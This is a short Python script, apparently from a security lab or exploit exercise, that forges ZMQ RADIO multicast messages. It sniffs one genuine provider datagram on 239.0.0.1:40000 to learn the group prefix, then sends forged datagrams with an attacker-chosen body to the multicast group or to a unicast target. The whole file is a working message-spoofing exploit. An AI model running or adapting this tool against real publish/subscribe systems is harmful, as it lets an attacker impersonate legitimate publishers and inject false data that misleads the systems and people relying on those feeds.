#!/usr/bin/env python3
"""forge_pub.py <iface-ip> <body> [count] [unicast-target-ip] : sniff one real provider RADIO datagram on 239.0.0.1:40000 to learn the
ZMQ group prefix, then multicast <count> forged datagrams [len][group][body\\0] from <iface-ip>."""
import socket, struct, sys, time
ip, body, n = sys.argv[1], sys.argv[2].encode(), int(sys.argv[3]) if len(sys.argv) > 3 else 1
dst = sys.argv[4] if len(sys.argv) > 4 else "239.0.0.1"
r = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
r.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
r.bind(("", 40000))
r.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton("239.0.0.1") + socket.inet_aton(ip))
r.settimeout(10)
real, src = r.recvfrom(65535)
g = real[1:1 + real[0]]
print("REAL from", src[0], "group", g.decode(), "body", real[1 + real[0]:1 + real[0] + 80])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(ip))
s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 4)
pkt = bytes([len(g)]) + g + body + b"\0"
for i in range(n):
    s.sendto(pkt, (dst, 40000)); time.sleep(0.02)
print("FORGED sent", n, "x", pkt, "to", dst)
